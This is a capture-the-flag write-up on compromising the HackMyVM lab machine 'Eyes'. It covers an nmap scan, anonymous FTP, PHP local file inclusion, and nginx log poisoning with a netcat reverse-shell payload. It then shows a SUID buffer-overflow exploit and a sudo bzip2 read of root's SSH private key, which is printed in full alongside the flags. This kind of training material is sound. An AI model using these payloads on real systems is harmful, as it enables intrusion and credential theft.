### 1. Initial Reconnaissance

First, I used `netdiscover` to identify active hosts on the network. The target machine was identified as `192.168.1.10`.

Next, I performed a comprehensive Nmap scan on the target to identify open ports, services, and their versions.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ nmap -sS -sV -sC -Pn --min-rate=1000 --max-retries=2 192.168.1.10 -p- -A
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 08:56 CDT
Nmap scan report for 192.168.1.10
Host is up (0.00052s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             125 Apr 04  2021 index.php
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

The Nmap scan revealed three open ports:

- **Port 21**: FTP (vsftpd 3.0.3) with anonymous login allowed
- **Port 22**: SSH (OpenSSH 7.9p1)
- **Port 80**: HTTP (nginx 1.14.2)


### 2. FTP Enumeration

Since anonymous FTP access was allowed, I connected to investigate available files.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ ftp 192.168.1.10
Connected to 192.168.1.10.
220 (vsFTPd 3.0.3)
Name (192.168.1.10:zengla): anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp> ls
229 Entering Extended Passive Mode (|||30730|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             125 Apr 04  2021 index.php
226 Directory send OK.
ftp> mget *
mget index.php [anpqy?]? y
229 Entering Extended Passive Mode (|||14504|)
150 Opening BINARY mode data connection for index.php (125 bytes).
226 Transfer complete.
125 bytes received in 00:00 (7.09 KiB/s)
```

I downloaded the `index.php` file and examined its contents:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ cat index.php
<?php
$file = $_GET['fil3'];
if(isset($file)){
include($file);
}else{
print("Here my eyes...");
}
?>
<!--Monica's eyes-->
```

The PHP code revealed a Local File Inclusion (LFI) vulnerability through the `fil3` parameter. The comment also hinted at a user named "Monica".

### 3. Web Exploitation - Local File Inclusion

I tested the LFI vulnerability by accessing the web application and reading system files.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ curl http://192.168.1.10
Here my eyes...
<!--Monica's eyes-->

┌──(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ curl http://192.168.1.10/?fil3=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ... (truncated for brevity) ...
monica:x:1000:1000:monica,,,:/home/monica:/bin/bash
# ... (truncated for brevity) ...
```

The LFI worked successfully, confirming the existence of the `monica` user (UID 1000).

### 4. Log Poisoning Attack

I attempted to achieve code execution through log poisoning by injecting PHP code into the nginx access logs via the User-Agent header, then including the log file.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ curl -A "<?php system('nc 192.168.1.3 4444 -e /bin/bash'); ?>" http://192.168.1.10
Here my eyes...
<!--Monica's eyes-->
```

Then I set up a netcat listener and triggered the log inclusion:

**Terminal 2 (Kali Listener):**

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.10 34260
```

**Terminal 1:**

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ curl http://192.168.1.10/?fil3=/var/log/nginx/access.log
```

The log poisoning was successful, and I received a reverse shell as `www-data`.

### 5. Initial Access (`www-data`)

After receiving the shell, I upgraded it to a fully interactive TTY:

```shellscript
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
www-data@eyes:~/html$
```

### 6. Local Enumeration

I explored the system and found interesting files in `/opt`:

```shellscript
www-data@eyes:/$ cd /opt
www-data@eyes:/opt$ ls
ls  ls.c  note.txt
www-data@eyes:/opt$ cat note.txt
Im preparing the new ls program.
-monica
www-data@eyes:/opt$ ls -la
total 36
drwxr-xr-x  2 root   root    4096 Apr  4  2021 .
drwxr-xr-x 18 root   root    4096 Apr  4  2021 ..
-rwsr-sr-x  1 root   root   16864 Apr  4  2021 ls
-rw-r--r--  1 root   root     349 Apr  4  2021 ls.c
-rw-r--r--  1 monica monica    41 Apr  4  2021 note.txt
```

The `/opt/ls` binary was SUID and owned by root. I examined the source code:

```shellscript
www-data@eyes:/opt$ cat ls.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>

int main(void){
 char command[100];
 char ls[50]="/usr/bin/ls";
 char name[50];
 printf("Enter your name:");
 gets(name);
 strcpy(command,ls);
 setuid(1000);
 setgid(1000);
 printf("Hi %s, Im executing ls\n Output:\n",name);
 system(command);
}
```

The code had a classic buffer overflow vulnerability due to the unsafe `gets()` function, which doesn't perform bounds checking on the `name` buffer (50 bytes).

### 7. Buffer Overflow Exploitation

I created a Python exploit using pwntools to exploit the buffer overflow:

```python
from pwn import *

padding = cyclic(64)
new_cmd = b"/usr/bin/ls;/bin/bash"
payload = padding+new_cmd
print(payload.decode())
```

The exploit generated a payload that would overflow the buffer and inject a command to execute both `ls` and `bash`.

```shellscript
┌──(venv)─(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ python exploit.py
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa/usr/bin/ls;/bin/bash
```

I then executed the SUID binary with this payload:

```shellscript
www-data@eyes:/opt$ ./ls
Enter your name:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa/usr/bin/ls;/bin/bash
Hi aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa/usr/bin/ls;/bin/bash, Im executing ls
 Output:
ls  ls.c  note.txt
monica@eyes:/opt$ id
uid=1000(monica) gid=33(www-data) groups=33(www-data)
```

The buffer overflow was successful! I gained access as the `monica` user (UID 1000).

### 8. Privilege Escalation to `monica`

Now as `monica`, I could access the user flag:

```shellscript
monica@eyes:/opt$ cd /home/monica
monica@eyes:/home/monica$ ls
flag.sh  user.txt
monica@eyes:/home/monica$ cat user.txt
hmvpinkeyes
```

The user flag is `hmvpinkeyes`.

### 9. Privilege Escalation to `root`

I checked `monica`'s sudo privileges:

```shellscript
monica@eyes:/home/monica$ sudo -l
Matching Defaults entries for monica on eyes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User monica may run the following commands on eyes:
    (ALL) NOPASSWD: /usr/bin/bzip2
```

`monica` could run `/usr/bin/bzip2` as root without a password. I researched how to exploit this for privilege escalation and discovered that `bzip2` can be used to read files by compressing them and outputting to stdout.

I used this to read root's SSH private key:

```shellscript
monica@eyes:/home/monica/test$ sudo bzip2 -c -f /root/.ssh/id_rsa | bunzip2
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEArFKlwNcXIsZLyj2E4waArCaGEOYVJxX50k4mF81nzPtiIgX+32e9sMfZd6oDpovRq2hEE8TKqdfHogyvpVHV2wBs/BLOAajO63GnFX8dAoBi/yzhnyYXgrNE9bCs5D6itQVBxC1EINy1TS67T14+jqK+9UNWdfQC8VlENBeaVbYI3vUSxQCbRqs92nQLrSVMhYOa0zhYdWlkCH46aprZi1OTe4ZvSfuzYU3+tmhonwiYMyeAYCSEsnkCeUTF4zke9kRovPupbKiPWoYHEKXPWYCDJ9xOD/K1yMsK8YJ2rOqyr5TkyO5HdEGZxj8MFMTFLyeyFG2kUHYyllW2WQoqZQAAA8DTPxkj0z8ZIwAAAAdzc2gtcnNhAAABAQCsUqXA1xcixkvKPYTjBoCsJoYQ5hUnFfnSTiYXzWfM+2IiBf7fZ72wx9l3qgOmi9GraEQTxMqp18eiDK+lUdXbAGz8Es4BqM7rcacVfx0CgGL/LOGfJheCs0T1sKzkPqK1BUHELUQg3LVNLrtPXj6Oor71Q1Z19ALxWUQ0F5pVtgje9RLFAJtGqz3adAutJUyFg5rTOFh1aWQIfjpqmtmLU5N7hm9J+7NhTf62aGifCJgzJ4BgJISyeQJ5RMXjOR72RGi8+6lsqI9ahgcQpc9ZgIMn3E4P8rXIywrxgnas6rKvlOTI7kd0QZnGPwwUxMUvJ7IUbaRQdjKWVbZZCiplAAAAAwEAAQAAAQEAgq5ajReQsAp5R3HH6PLxeZvtZ7tUp0N/JQGm2b4nzceF8A9j7cAalom4XYtNIWw/ISH9HpDKsGq3NikwusqIx4BXJgKMv61o3hxefWrccR0z9hfvMmYMxk11Km1FcAIgGe9WpJM/azx1MYcS/WmXP0wkTJM4alMWODleA7Myk3QuG/jwVEZE37xaJHPwTpv9VRbqIjqw9XQbGvArzyuAsGWtMMMpZ3zwx5LuthcWa2B0u4ND+KCi6vk/phwtoHJL26FiCFHdNUda7UgssdBQ0jby/0wdHK4BvwooZS6v23Ly1Lw37prz8GN8S504Xa5zKG0St1Xb+rT77lRDOsfTgQAAAIEAjbYIgPvhTt3ZS+ne8RiDgwrIOZIKCwb+s5o5F0vH0c/++s+weAghl+Fn8QfgCAMHapEZmyKjvLbixUT2B8F765S46omR8PD3i0Rr0j+pbBz9jNga/+XJjctLF+atU3aG0tB1Nc5Z/+eGtHjL1UJPNRaHtyb3ztgOvMAN/5ZR8sMAAACBANl6TrhqiJaQcOdOT05Y4FxSh4r4ng2TTd5k1B9d2lSIVKeviKtjL4QDlT/uzE6Rf0bNgunP+qT5YjB4ag/17sm7GDzSd+8MDnkeRTDEtHjPwLEHUYDyNl0/wS9B+rlHu84WMYexmltA30PjAUQXaztYcKortlBHF8PRqHcatJaJAAAAgQDK2MGRmyabimXNUrsppl+JsMn/xvaUj6AvlTmdyH7rGmjwa4s9OP503AX59/pRyyhGOuPyaiWR8kNp5YOkH0Zv8bGSSWUP3b7ScjgCMVaXXVmEgG+feZyf1swM2WwQVZzs152wZcrK3hFG/vIFlFwcDD3ypN2NMCkY0EFGqmz9/QAAAAlyb290QGV5ZXM=
-----END OPENSSH PRIVATE KEY-----
```

### 10. Root Access

I saved the SSH private key to a file on my Kali machine and used it to log in as root:

```shellscript
┌──(venv)─(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ echo '-----BEGIN OPENSSH PRIVATE KEY-----
# ... (key content) ...
-----END OPENSSH PRIVATE KEY-----' > id_rsa

┌──(venv)─(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ chmod 600 id_rsa

┌──(venv)─(zengla㉿kali)-[~/Desktop/hackmyvm/eyes]
└─$ ssh -i id_rsa root@192.168.1.10
Linux eyes 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
# ... (login banner) ...
root@eyes:~# id
uid=0(root) gid=0(root) groups=0(root)
```

I successfully gained root access! Finally, I retrieved the root flag:

```shellscript
root@eyes:~# ls
flag.sh  root.txt.bz2
root@eyes:~# bunzip2 root.txt.bz2
root@eyes:~# ls
flag.sh  root.txt
root@eyes:~# cat root.txt
boomroothmv
```

The root flag is `boomroothmv`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified target IP `192.168.1.10` with FTP (21), SSH (22), and HTTP (80) services.
2. **FTP Enumeration:** Anonymous FTP access revealed `index.php` with LFI vulnerability.
3. **Web Exploitation:** Used LFI to read `/etc/passwd` and discovered `monica` user.
4. **Log Poisoning:** Injected PHP code via User-Agent header and included nginx access logs to achieve RCE.
5. **Initial Access (`www-data`):** Gained reverse shell through log poisoning.
6. **Local Enumeration:** Found custom SUID binary `/opt/ls` with buffer overflow vulnerability.
7. **Buffer Overflow Exploitation:** Created Python exploit using pwntools to overflow buffer and execute `/bin/bash` as `monica`.
8. **Privilege Escalation to `monica`:** Obtained user flag `hmvpinkeyes`.
9. **Privilege Escalation to `root`:** Exploited `sudo` access to `/usr/bin/bzip2` to read root's SSH private key.
10. **Root Access:** Used extracted SSH key to log in as root and retrieved root flag `boomroothmv`.
